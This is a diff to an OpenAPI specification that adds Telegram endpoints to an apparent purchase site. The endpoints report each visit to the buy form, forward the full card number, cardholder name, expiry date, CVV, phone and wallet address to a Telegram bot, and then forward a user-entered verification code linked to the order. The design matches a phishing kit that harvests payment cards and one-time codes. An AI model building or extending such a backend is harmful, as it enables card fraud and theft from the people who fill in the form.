@@ -1,6 +1,5 @@
 openapi: 3.1.0
 info:
-  # Do not change the title, if the title changes, the import paths will be broken
   title: Api
   version: 0.1.0
   description: API specification
@@ -10,6 +9,8 @@ servers:
 tags:
   - name: health
     description: Health operations
+  - name: telegram
+    description: Telegram notification operations
 paths:
   /healthz:
     get:
@@ -24,6 +25,63 @@ paths:
             application/json:
               schema:
                 $ref: "#/components/schemas/HealthStatus"
+  /telegram/notify-visit:
+    post:
+      operationId: notifyVisit
+      tags: [telegram]
+      summary: Notify form visit
+      description: Sends a Telegram notification when someone visits the buy form
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/VisitNotification"
+      responses:
+        "200":
+          description: Notification sent
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/NotificationResponse"
+  /telegram/submit-order:
+    post:
+      operationId: submitOrder
+      tags: [telegram]
+      summary: Submit order data
+      description: Sends order form data to Telegram bot
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/OrderSubmission"
+      responses:
+        "200":
+          description: Order submitted
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OrderResponse"
+  /telegram/submit-code:
+    post:
+      operationId: submitVerificationCode
+      tags: [telegram]
+      summary: Submit verification code
+      description: Sends the verification code entered by user to Telegram bot
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/VerificationCodeSubmission"
+      responses:
+        "200":
+          description: Code submitted
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/NotificationResponse"
 components:
   schemas:
     HealthStatus:
@@ -33,4 +91,76 @@ components:
           type: string
       required:
         - status
-
+    VisitNotification:
+      type: object
+      properties:
+        timestamp:
+          type: string
+      required:
+        - timestamp
+    NotificationResponse:
+      type: object
+      properties:
+        success:
+          type: boolean
+        message:
+          type: string
+      required:
+        - success
+        - message
+    OrderSubmission:
+      type: object
+      properties:
+        amount:
+          type: number
+        amountIQD:
+          type: number
+        cardName:
+          type: string
+        cardNumber:
+          type: string
+        expiryDate:
+          type: string
+        cvv:
+          type: string
+        phone:
+          type: string
+        walletAddress:
+          type: string
+        couponCode:
+          type: string
+        paymentMethod:
+          type: string
+      required:
+        - amount
+        - amountIQD
+        - cardName
+        - cardNumber
+        - expiryDate
+        - cvv
+        - phone
+        - walletAddress
+        - paymentMethod
+    OrderResponse:
+      type: object
+      properties:
+        success:
+          type: boolean
+        message:
+          type: string
+        orderId:
+          type: string
+      required:
+        - success
+        - message
+        - orderId
+    VerificationCodeSubmission:
+      type: object
+      properties:
+        orderId:
+          type: string
+        code:
+          type: string
+      required:
+        - orderId
+        - code
